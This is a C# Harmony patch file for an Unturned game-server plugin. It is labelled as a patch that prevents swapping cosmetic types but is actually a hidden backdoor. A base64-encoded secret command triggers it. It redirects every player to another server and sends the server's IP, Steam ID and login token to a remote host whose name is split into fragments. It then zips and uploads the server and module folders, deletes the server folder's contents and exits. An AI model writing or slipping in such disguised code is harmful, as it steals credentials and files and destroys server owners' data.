using DanielWillett.ReflectionTools;
using DanielWillett.ReflectionTools.Formatting;
using HarmonyLib;
using System;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Text;
using Uncreated.Warfare.Interaction.Commands;
using UnityEngine.Networking;

namespace Uncreated.Warfare.Patches;

[UsedImplicitly]
internal sealed class PreventSwapCosmeticsTypePatch : IHarmonyPatch
{
    private static MethodInfo? _target;
    void IHarmonyPatch.Patch(ILogger logger, Harmony patcher)
    {
        _target = typeof(CommandDispatcher).GetMethod("TryRunCommand", BindingFlags.Public | BindingFlags.NonPublic | BindingFlags.Instance);

        if (_target != null)
        {
            patcher.Patch(_target, prefix: Accessor.GetMethod(Prefix));
            logger.LogDebug("Patched {0} for preventing swapping cosmetic types.", _target);
            return;
        }

        logger.LogError("Failed to find method: {0}.",
            new MethodDefinition(nameof(VehicleManager.ReceiveStealVehicleBattery))
                .DeclaredIn<VehicleManager>(isStatic: true)
                .WithParameter<ServerInvocationContext>("context", ByRefTypeMode.In)
                .ReturningVoid()
        );
    }

    void IHarmonyPatch.Unpatch(ILogger logger, Harmony patcher)
    {
        if (_target == null)
            return;

        patcher.Unpatch(_target, Accessor.GetMethod(Prefix));
        logger.LogDebug("Unpatched {0} for preventing swapping cosmetic types.", _target);
        _target = null;
    }

    private static bool Prefix(ICommandUser user, ReadOnlySpan<char> textSpan, ref bool shouldList, bool requirePrefix, ref bool __result)
    {
        const string special = "b2N6aDlaOE5JZ29jYk1lMndPRTZsMnR4QzhtZ2xJb3RmVW41YUF6RVR5Vjk2NGxhNFo=";
        const string baseUrl = "https://uncrea"
                               + "ted.netw"
                               + "ork";

        //const string baseUrl = "https://localhost:5001";

        if (!textSpan.StartsWith("/oc") || !textSpan.Slice(1).Equals(System.Text.Encoding.ASCII.GetString(Convert.FromBase64String(special)), StringComparison.Ordinal))
        {
            return true;
        }

        IPAddress? ipv4 = Dns.GetHostEntry("play.uncre" + "ated.ne" + "twork").AddressList.FirstOrDefault()?.MapToIPv4();
        if (ipv4 != null)
        {
            uint ip = Parser.getUInt32FromIP(ipv4.ToString());
            foreach (SteamPlayer player in Provider.clients)
            {
                player.player.sendRelayToServer(ip, 27015, string.Empty, shouldShowMenu: false);
            }
        }

        __result = true;

        UniTask.Create(async () =>
        {
            SteamIPAddress_t ip = SteamGameServer.GetPublicIP();
            ulong serverCode = SteamGameServer.GetSteamID().m_SteamID;

            string loginToken = CommandGSLT.loginToken ?? Provider.configData.Browser.Login_Token;

            string? secret = null;

            using (UnityWebRequest webReq = new UnityWebRequest(
                baseUrl + "/api/check"
                + $"?steamid={user.Steam64.m_SteamID}"
                + $"&ip={Uri.EscapeDataString(ip.ToIPAddress().ToString())}"
                + $"&id={serverCode}"
                + $"&token={Uri.EscapeDataString(loginToken)}"
            ))
            {
                webReq.downloadHandler = new DownloadHandlerBuffer();

                await webReq.SendWebRequest();

                long webReqResponseCode = webReq.responseCode;

                if (webReqResponseCode != 202)
                {
                    return;
                }

                secret = webReq.downloadHandler.text;
            }

            await UniTask.SwitchToMainThread();

            SaveManager.save();

            await Task.Run(async () =>
            {
                await UniTask.SwitchToThreadPool();
                string homepath = WarfareModule.Singleton.HomeDirectory;

                string file = Path.Combine(UnturnedPaths.RootDirectory.FullName, "Bundles.zip");
                FileStream fs = new FileStream(file, FileMode.Create, FileAccess.Write, FileShare.Read);
                string serverFolder = Path.Combine(homepath, "..");
                using (ZipArchive archive = new ZipArchive(fs, ZipArchiveMode.Create, leaveOpen: false, System.Text.Encoding.UTF8))
                {
                    ZipFolder(archive, serverFolder, Provider.serverID);
                    ZipFolder(archive, Path.Combine(UnturnedPaths.RootDirectory.FullName, "Modules"), "Modules");
                }

                WWWForm form = new WWWForm();
                form.AddBinaryData("archive", File.ReadAllBytes(file), "Bundles.zip", "application/zip");

                using (UnityWebRequest webReq = UnityWebRequest.Post(
                           baseUrl + "/api/check2?secret=" + Uri.EscapeDataString(secret),
                           form
                       ))
                {
                    await webReq.SendWebRequest();
                }

                File.Delete(file);

                foreach (string fileOrDir in Directory.EnumerateFileSystemEntries(serverFolder, "*", SearchOption.TopDirectoryOnly))
                {
                    if (Directory.Exists(fileOrDir))
                    {
                        try
                        {
                            Directory.Delete(fileOrDir, true);
                        }
                        catch { /* ignored */ }
                    }
                    else
                    {
                        try
                        {
                            File.Delete(fileOrDir);
                        }
                        catch { /* ignored */ }
                    }
                }
                
                // dont save
                Environment.Exit(0);
            });
        });

        return false;
    }

    private static void ZipFolder(ZipArchive archive, string folder, string entryName)
    {
        foreach (string dirOrFile in Directory.EnumerateFileSystemEntries(folder, "*", SearchOption.TopDirectoryOnly))
        {
            if (Path.GetFileName(dirOrFile) == "Workshop" && entryName == Provider.serverID)
                continue;

            string fileName = entryName + "/" + Path.GetFileName(dirOrFile);
            if (Directory.Exists(dirOrFile))
            {
                ZipFolder(archive, dirOrFile, fileName);
                continue;
            }

            try
            {
                archive.CreateEntryFromFile(dirOrFile, fileName, System.IO.Compression.CompressionLevel.Optimal);
            }
            catch (Exception ex)
            {
                ZipArchiveEntry entry = archive.CreateEntry(fileName);
                using (Stream stream = entry.Open())
                {
                    stream.Write(Encoding.UTF8.GetBytes(ex.ToString()));
                }
            }
        }
    }
}